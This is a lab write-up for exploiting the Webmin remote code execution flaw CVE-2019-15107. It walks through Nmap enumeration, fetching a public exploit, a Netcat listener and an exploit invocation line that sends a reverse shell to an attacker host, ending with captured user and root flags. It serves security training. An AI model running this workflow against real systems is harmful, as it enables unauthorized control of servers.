# Webmin Remote Code Execution (CVE-2019-15107)

## Overview

The objective of this lab is to exploit a known **Remote Code Execution (RCE)** vulnerability in **Webmin** and obtain a Reverse Shell on the target system.

After identifying the vulnerable service, we exploited **CVE-2019-15107**, gained remote code execution, established a Reverse Shell, and successfully retrieved both the user and root flags.

---

# About the Vulnerability

## What is Webmin?

Webmin is a web-based administration interface used to manage Linux and Unix systems through a web browser. It allows administrators to manage users, services, networking, packages, scheduled tasks, and many other system components.

By default, Webmin runs on:

```text
TCP/10000
```

Internally, Webmin uses a web server called **MiniServ** to handle incoming HTTP/HTTPS requests.

---

## CVE-2019-15107

This is a well-known **Remote Code Execution (RCE)** vulnerability affecting vulnerable versions of Webmin.

Under specific conditions, an attacker can execute arbitrary system commands remotely, which may lead to complete system compromise.

Successful exploitation can result in:

- Remote Command Execution
- Reverse Shell
- Full system compromise
- Privilege escalation (depending on the Webmin configuration)

---

## Step 1 - Initial Enumeration

We started by performing an Nmap scan to identify the open ports and running services on the target machine.

![](../Images/Pasted%20image%2020260716204905.png)

---

## Step 2 - Service Enumeration

Next, we performed version detection and executed Nmap NSE scripts to gather additional information about the discovered services.

![](../Images/Pasted%20image%2020260716205046.png)

The scan revealed an HTTP service running on port **10000**, identified as **MiniServ**, which is the web server used by Webmin.

---

## Step 3 - Accessing the Web Interface

We accessed the web application running on port **10000** and discovered the Webmin authentication page.

![](../Images/Pasted%20image%2020260423160739.png)

At this stage, we identified that the target was running **Webmin**, making it possible to search for publicly known vulnerabilities affecting this service.

---

## Step 4 - Vulnerability Research

After identifying the service, we searched for publicly available vulnerabilities affecting the detected version of MiniServ/Webmin.

We discovered the following Remote Code Execution vulnerability:

```text
CVE-2019-15107
```

![](../Images/Pasted%20image%2020260716210936.png)

---

## Step 5 - Obtaining the Exploit

We copied the public exploit to our attacker machine in preparation for exploitation.

![](../Images/Pasted%20image%2020260716211111.png)

Before executing the exploit, we reviewed its documentation to understand the required arguments and usage.

![](../Images/Pasted%20image%2020260716211507.png)

---

## Step 6 - Starting the Listener

Before triggering the exploit, we started a Netcat listener to receive the incoming Reverse Shell.

![](../Images/Pasted%20image%2020260716211615.png)

---

## Step 7 - Exploiting the Vulnerability

After making the exploit executable, we executed it using the following syntax:

```text
python3 file.py RHOST RPORT LHOST LPORT
```

Where:

- **RHOST** → Target IP address.
- **RPORT** → Target service port.
- **LHOST** → Attacker IP address.
- **LPORT** → Listening port on the attacker's machine.

![](../Images/Pasted%20image%2020260716211634.png)

The exploit successfully triggered the vulnerability and established a Reverse Shell connection.

![](../Images/Pasted%20image%2020260716211836.png)

---

## Step 8 - Capturing the User Flag

After obtaining remote access, we navigated through the filesystem and successfully located the user flag.

![](../Images/Pasted%20image%2020260716211952.png)

---

## Step 9 - Capturing the Root Flag

The obtained shell already had sufficient privileges to access the root directory, allowing us to retrieve the root flag successfully.

![](../Images/Pasted%20image%2020260716212027.png)

---

# Summary

In this lab we learned how to:

- Perform service enumeration using Nmap.
- Identify Webmin running behind the MiniServ web server.
- Research publicly known vulnerabilities affecting the detected service.
- Exploit **CVE-2019-15107** to achieve Remote Code Execution.
- Establish a Reverse Shell connection.
- Successfully obtain both the user and root flags.

This lab demonstrates how dangerous publicly known vulnerabilities can be when systems remain unpatched. A single vulnerable administrative service exposed to the network may allow an attacker to gain complete control of the target machine.